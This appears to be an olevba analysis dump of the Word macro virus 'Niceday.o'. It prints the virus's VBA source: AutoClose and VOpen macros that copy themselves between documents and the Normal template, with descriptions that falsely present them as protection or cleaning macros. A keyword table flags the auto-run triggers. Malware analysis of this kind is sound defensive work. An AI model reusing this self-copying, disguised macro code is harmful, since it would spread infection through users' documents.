olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Niceday.o-fe6bba6540332827d3453496539cb64c0233ce0f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Niceday.o-fe6bba6540332827d3453496539cb64c0233ce0f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Niceday.o-fe6bba6540332827d3453496539cb64c0233ce0f - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim vZap$
Dim vMacro$
    On Error GoTo -1: On Error GoTo Abort

        WordBasic.FileSaveAs Format:=1

        vZap$ = WordBasic.[FileName$]()

        vMacro$ = vZap$ + ":Payload"
        WordBasic.MacroCopy "Global:PayLoad", vMacro$

        vMacro$ = vZap$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", vMacro$

        vMacro$ = vZap$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:VOpen", vMacro$

        vMacro$ = vZap$ + ":VClose"
        WordBasic.MacroCopy "Global:AutoClose", vMacro$

        WordBasic.FileSaveAs Format:=1

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PayLoad.bas 
in file: Virus.MSWord.Niceday.o-fe6bba6540332827d3453496539cb64c0233ce0f - OLE stream: 'Macros/VBA/PayLoad'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Null macro to prevent prank macros from re-installing.  Do not delete."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PayLoad.MAIN"
    Rem That's enough to prove my point
End Sub
-------------------------------------------------------------------------------
VBA MACRO VOpen.bas 
in file: Virus.MSWord.Niceday.o-fe6bba6540332827d3453496539cb64c0233ce0f - OLE stream: 'Macros/VBA/VOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VOpen.MAIN"
Dim vZap$
Dim vMacro$
    On Error GoTo -1: On Error GoTo Abort
    
            vZap$ = WordBasic.[FileName$]()

            vMacro$ = vZap$ + ":Payload"
            WordBasic.MacroCopy vMacro$, "Global:PayLoad"

            vMacro$ = vZap$ + ":AutoExit"
            WordBasic.MacroCopy vMacro$, "Global:AutoExit"

            vMacro$ = vZap$ + ":AutoOpen"
            WordBasic.MacroCopy vMacro$, "Global:VOpen"

            vMacro$ = vZap$ + ":VClose"
            WordBasic.MacroCopy vMacro$, "Global:AutoClose"

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Niceday.o-fe6bba6540332827d3453496539cb64c0233ce0f - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

